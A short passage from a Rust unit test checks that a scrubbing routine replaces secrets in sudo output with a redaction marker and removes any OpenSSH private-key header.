    assert!(
        scrubbed
            .sanitized_output
            .contains("REDACTED_SECRET_IN_SUDO_OUTPUT"),
        "expected secret redaction, got: {}",
        scrubbed.sanitized_output
    );
    assert!(
        !scrubbed
            .sanitized_output
            .contains("BEGIN OPENSSH PRIVATE KEY")
    );
}
